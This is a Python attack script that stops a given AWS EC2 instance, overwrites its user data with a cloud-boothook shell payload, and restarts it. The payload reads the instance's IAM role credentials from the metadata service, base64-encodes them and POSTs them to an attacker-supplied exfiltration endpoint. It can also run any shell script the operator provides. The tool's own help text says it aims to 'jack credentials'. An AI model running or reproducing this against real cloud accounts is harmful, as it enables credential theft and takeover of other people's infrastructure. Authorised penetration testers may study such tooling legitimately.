#!/usr/bin/env python
from __future__ import print_function
import boto3
from botocore.exceptions import ClientError
import json
import argparse
import time


def main(args):
    result = stop_instance(args.instance_id)
    if result:
        update_userdata(args.instance_id, prepare_user_data())
        start_instance(args.instance_id)
    else:
        print('Failed to stop instance, quitting.')


def stop_instance(instance_id):
    print('Stopping instance.')
    client = boto3.client('ec2')
    result = False
    
    try:
        response = client.stop_instances(
            InstanceIds=[instance_id]
        )
        result = True
    except ClientError as e:
        print(e.response['Error']['Message'])

    return result
    

def start_instance(instance_id):
    print('Starting instance.')
    client = boto3.client('ec2')
    result = False
    
    try:
        response = client.start_instances(
            InstanceIds=[instance_id]
        )
        result = True
    except ClientError as e:
        print(e.response['Error']['Message'])

    return result


def prepare_user_data():
    userData = "#cloud-boothook\n"
    if args.exfiltration_endpoint:
        userData += '''#!/bin/bash
profile=`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/`
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/${profile} > /tmp/garbage
garbage=`base64 -w 0 /tmp/garbage`
curl -X POST -d "garbage=${garbage}" ''' + args.exfiltration_endpoint
    elif args.code_file:
        userData += args.code_file.read()

    return userData


def update_userdata(instance_id, user_data):
    print('Setting userData.')
    client = boto3.client('ec2')
    result = False
    code = 'IncorrectInstanceState'
    
    while(code == 'IncorrectInstanceState' and not result):
        try:
            response = client.modify_instance_attribute(
                InstanceId=instance_id,
                UserData={
                    'Value': user_data
                }
            )
            result = True
        except ClientError as e:
            code = e.response['Error']['Code']
            if code != 'IncorrectInstanceState':
                print(e.response['Error']['Message'])
        time.sleep(20)
    return result


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Attempts to jack credentials from an ec2 instance or run a shell script of your choice.")
    parser.add_argument('-i',
                        '--instance-id',
                        required=True)
    parser.add_argument('-e',
                        '--exfiltration-endpoint',
                        required=False)
    parser.add_argument('-c',
                        '--code-file',
                        type=argparse.FileType('r'),
                        required=False)
    args = parser.parse_args()
    main(args)